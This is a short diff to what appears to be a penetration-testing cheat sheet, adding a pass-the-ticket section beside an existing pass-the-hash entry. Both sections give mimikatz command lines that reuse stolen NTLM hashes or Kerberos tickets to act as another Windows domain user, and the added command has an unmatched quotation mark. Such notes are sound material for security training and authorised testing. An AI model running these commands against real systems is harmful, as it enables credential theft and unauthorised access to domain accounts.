@@ -50,3 +50,9 @@ Using the `sekurlsa::pth` module we can perform a pass-the-hash attack. It start
 C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /NTLM:<hash> /domain:<AD_domain> /run:cmd.exe" exit
 ```
 > We can specify any program in the `/run:` flag to launch any program but a shell is often most useful.
+
+### Pass the Ticket
+Using the `kerberos::ptt` module we can perform a pass-the-ticket attack using a `.kirbi` ticket file.
+```cmd
+C:\> mimikatz.exe privilege::debug "kerberos::ptt <ticket_file> exit
+```
